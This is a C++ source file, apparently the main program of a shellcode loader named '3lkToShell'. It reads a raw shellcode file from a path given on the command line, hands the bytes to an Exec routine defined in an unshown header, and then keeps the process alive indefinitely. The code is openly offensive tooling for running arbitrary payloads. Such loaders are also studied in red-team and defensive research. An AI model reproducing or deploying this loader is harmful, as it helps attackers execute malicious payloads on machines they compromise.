#include "3lkToShell.hpp"

#pragma managed(push, off)

int main(int argc, char** argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc != 2) {
        printf("\n[+] Usage:\n\n\t%s /path/to/shellcode.bin\n", argv[0]);
        return -1;
    }

    printf("================================ 3lktoShell ================================\n");
    char* sc_path = argv[1];
    DWORD shellcode_size = 0;
    printf("[+] Reading shellcode from:\t\t%s\n", sc_path);
    BYTE* shellcode = read_shellcode(sc_path, &shellcode_size);

    if ((shellcode == NULL) || (shellcode_size == 0)) return -1;
    printf("[+] Read %ld bytes of shellcode from disk\n", shellcode_size);

    Exec(shellcode, shellcode_size);
    printf("[*] Main thread parks forever; Ctrl+C to exit.\n");

    HANDLE hHold = CreateEvent(NULL, TRUE, FALSE, NULL);
    WaitForSingleObject(hHold, INFINITE);

    if (shellcode) free(shellcode);
}

#pragma managed(pop)